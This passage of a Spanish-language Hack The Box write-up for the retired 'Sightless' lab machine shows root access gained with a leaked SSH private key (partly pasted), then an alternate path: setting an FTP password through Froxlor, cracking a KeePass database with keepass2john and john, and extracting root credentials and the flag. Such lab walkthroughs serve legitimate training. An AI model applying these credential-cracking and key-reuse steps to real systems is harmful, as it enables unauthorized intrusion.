Z2XeUGAJe7JDb40G9EB14UAk6XjeU5tWb0zkKypA+ixfyW59kRlca9mRHEeGXKT+08Ivm9
SfYtlYzbYDD/EcW2ajFKdX/wjhq049qPQNpOTE0bNkTLFnujQ78RyPZ5oljdkfxiw6NRi7
qyhOZp09LBmNN241/dHFxm35JvVkLqr2cG+UTu0NtNKzMcXRxgJ76IvwuMqp+HxtJPzC/n
yyujI/x1rg9B60AAAAEBAMhgLJFSewq2bsxFqMWL11rl6taDKj5pqEH36SStBZPwtASKvO
OrCYzkNPqQYLtpqN4wiEX0RlcqawjjBxTtYKpEbosydNYk4DFo9DXpzK1YiJ/2RyvlE7XT
UHRRgU7G8n8Q53zOjkXiQgMU8ayCmlFg0aCBYu+3yqp5deTiDVUVVn1GJf4b6jWuJkbyvy
uVmkDYBHxpjscG0Z11ngNu89YhWmDZfu38sfEcV828cHUW2JJJ/WibCCzGRhG4K1gLTghL
L+/cNo97CK/6XHaEhEOHE5ZWvNR6SaiGzhUQzmz9PIGRlLX7oSvNyanH2QORwocFF0z1Aj
+6dwxnESdflQcAAAEBAPG196zSYV4oO75vQzy8UFpF4SeKBggjrQRoY0ExIIDrSbJjKavS
0xeH/JTql1ApcPCOL4dEf3nkVqgui5/2rQqz901p3s8HGoAiD2SS1xNBQi6FrtMTRIRcgr
46UchOtoTP0wPIliHohFKDIkXoglLtr8QBNBS7SEI+zTzlPVYZNw8w0fqcCh3xfjjy/DNm
9KlxLdjvS21nQS9N82ejLZNHzknUb1fohTvnnKpEoFCWOhmIsWB9NhFf7GQV1lUXdcRy1f
ojHlAvysf4a4xuX72CXMyRfVGXTtK3L18SZksdrg0CAKgxnMGWNkgD6I/M+EwSJQmgsLPK
tLfOAdSsE7MAAAASam9obkBzaWdodGxlc3MuaHRiAQ==
-----END OPENSSH PRIVATE KEY-----
```

Desde la misma máquina podermos utilizar la clave para autenticarnos como usuario `root` y ganar el acceso completamente.

```bash
michael@sightless:/tmp$ ssh -i id_rsa root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Last login: Fri Jan 17 01:52:26 2025 from 10.10.16.5
root@sightless:~# hostname
sightless
```

También lo que podremos realizar es copiar el contenido de la clave privada en nuestro equipo local, le daremos los permisos necesarios y procederemos a conectarnos. Verificaremos que logramos mostrar el contenido de la flag **root.txt**.

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.32
Last login: Tue Sep  3 08:18:45 2024
root@sightless:~# hostname 
sightless
root@sightless:~# cat /root/root.txt 
13f85930a270ac2*****************
```

## Original Privilege Escalation (PrivEsc)

Después de revisar el WriteUp original una vez que la máquina `Sightless` se encuentra retirada en HTB, verificamos la ruta de la escalada de privilegios original por la cual estaba planeada la máquina.

En un principio, la ruta que nosotros logramos explotar inicialmente también es válida, ya que nos aprovechanos de las funciones que ofrece `Froxlor`.

### Accesing FTP Server

En la página web de `Froxlor`, verificamos que en el aprtado de `Resources < Customers`, aparece que hay un usuario llamado `web01`.

<figure><img src="../../../../.gitbook/assets/imagen (80).png" alt=""><figcaption></figcaption></figure>

Al acceder a este usuario dándole en el hipervínculo que nos aparecía, verificamos que tiene acceso a una pestaña llamada `FTP < Accounts`. Al acceder a esta página, verificamos que existe un usuario llamado `web1` que parece indicarnos que es válido pra acceder al FTP que enumeramos principalmente en el escaneo inicial con `Nmap`.

<figure><img src="../../../../.gitbook/assets/imagen (81).png" alt=""><figcaption></figcaption></figure>

Al editar la cuenta del usuario de FTP, verificamos que podemos asignarle una contraseña al usurio. En nuestro caso le pondremos: `Password01`

<figure><img src="../../../../.gitbook/assets/imagen (82).png" alt=""><figcaption></figcaption></figure>

Procederemos de autenticarnos al servicio `FTP` con las credenciales `web1/Password01` y que ganamos del acceso correcamente.

Enumerando los directorios disponibles en el servicio FTP, verificamos que hay un archivo de una base de datos de _**Keepass**_, el cual procederemos a descargarlo de manera local para verificar sobre él.

<figure><img src="../../../../.gitbook/assets/imagen (83).png" alt=""><figcaption></figcaption></figure>

### Cracking and accessing Keepass 1.x vault

Verificamos que abriendo el archivo nos requería de credenciales para acceder a él. Por otro lado, comprobamos que el archivo se trata de una base de datos de _**Keepass 1.x**_.

Procederemos a obtener el hash de la contraseña maestra del _**Keepass**_ a través de la herramienta de `keepass2john`.

```bash
❯ ls -l Database.kdb
.rw-rw-r-- kali kali 5.2 KB Fri Jan 17 02:59:52 2025  Database.kdb
❯ file Database.kdb
Database.kdb: Keepass password database 1.x KDB, 8 groups, 4 entries, 600000 key transformation rounds
❯ keepass2john Database.kdb > hash.txt
Inlining Database.kdb
```

Con la herramienta de `john` procederemos a crackear el hash y en este caso nos logra mostrar la contraseña en texto plano.

```bash
❯ john --wordlist:/usr/share/wordlists/rockyou.txt hash.txt --format=KeePass
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldogs         (Database.kdb)     
1g 0:00:00:53 DONE (2025-01-17 03:04) 0.01854g/s 19.58p/s 19.58c/s 19.58C/s abcd1234..peterpan
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Dado que se trata de una base de datos de _**Keepass 1.x**_, deberemos de descargarnos la herramienta de `kpcli` para poder trabajar con el archivo de la base de datos de contraseñas. Verificaremos que proporcionándole la contraseña maestra abtenida logramos el acceso correctamente.

```bash
❯ kpcli --kdb=Database.kdb
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

Revisamos que disponemos de de un directorio `/General/sightless.htb/Backup` el cual dispone de un archivo llamado `ssh` y de unas credenciales.

```bash
kpcli:/General/sightless.htb/Backup> ls
=== Entries ===
0. ssh                                                                    
kpcli:/General/sightless.htb/Backup> show -f ssh

 Path: /General/sightless.htb/Backup/
Title: ssh
Uname: root
 Pass: q6gnLTB74L132TMdFCpK
  URL: 
Notes: 
Atchm: id_rsa (3428 bytes)

kpcli:/General/sightless.htb/Backup> 
```

Procederemos a revisar el archivo `ssh`, verificamos que existe un archivo llamado `id_rsa` que parece ser una clave privada SSH, lo exportaremos en nuestro directorio de trabajo.

```bash
kpcli:/General/sightless.htb/Backup> attach ssh
Atchm: id_rsa (3428 bytes)
Choose: (a)dd/(e)xport/(d)elete/(c)ancel/(F)inish? 
Path to file: /home/kali/Desktop/HackTheBox/Linux/Sightless/content
Saved to: /home/kali/Desktop/HackTheBox/Linux/Sightless/content/id_rsa
Atchm: id_rsa (3428 bytes)
```

### Becoming root with backup of id\_rsa file obtained

Le daremos los permisos necesarios a la clave privada encontrada en el directorio `Backup`, y en este caso nos muestraa un mensaje de eror de `libcrypto`.

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.32
Load key "id_rsa": error in libcrypto
root@10.10.11.32's password:
```

Lo que realizaremos es copiar el contenido de la clave privada en un nuevo archivo llamado `root_key` para evitar que hayan carácteres extraños en el archivo orignalmente exportada.

Verificaremos que si procedemos nuevamente de conectarnos al SSH mediante la clave privada del usuario `root`, ganamos acceso a la máquina y visualizamos la flag de **root.txt**.

```bash
❯ chmod 600 root_key
❯ ls -l root_key
.rw------- kali kali 3.3 KB Fri Jan 17 03:17:53 2025  root_key
❯ ssh -i root_key root@10.10.11.32
Last login: Fri Jan 17 01:53:26 2025 from 127.0.0.1
root@sightless:~$ hostname
sightless
root@sightless:~$ cat /root/root.txt 
13f85930a270ac2f74f39cbc8574cf1e
```
